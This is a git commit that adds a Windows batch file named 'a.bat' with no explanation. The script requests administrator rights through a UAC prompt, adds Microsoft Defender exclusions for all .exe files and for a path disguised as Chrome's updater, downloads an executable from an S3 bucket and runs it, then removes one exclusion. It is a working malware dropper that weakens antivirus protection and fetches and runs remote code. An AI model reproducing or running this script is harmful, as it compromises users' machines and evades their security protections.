30dfc1bbb56da11cb6cf06c4ed153fd799e16749
seition322 <126213895+seition322@users.noreply.github.com>
2023-03-26 21:14:00 +0300

    Create a.bat

---
+++ a.bat
@@ -0,0 +1,32 @@
+@echo off
+
+:: BatchGotAdmin
+:-------------------------------------
+REM  --> Check for permissions
+>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
+
+if '%errorlevel%' NEQ '0' (
+    echo Requesting administrative privileges...
+    goto UACPrompt
+) else ( goto gotAdmin )
+
+:UACPrompt
+    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
+    set params = %*:"=""
+    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"
+
+    "%temp%\getadmin.vbs"
+    del "%temp%\getadmin.vbs"
+    exit /B
+
+:gotAdmin
+    pushd "%CD%"
+    CD /D "%~dp0"
+:--------------------------------------
+Powershell -Command "Set-MpPreference -ExclusionExtension exe"
+cd %TEMP%
+Powershell -Command "Invoke-Webrequest 'https://depo3.s3.eu-central-1.amazonaws.com/update' -OutFile installer.exe"
+Powershell -Command "Add-MpPreference -ExclusionPath 'C:\Program Files\Google\Chrome\updater.exe'"
+installer.exe
+
+Powershell -Command "Remove-MpPreference -ExclusionExtension exe
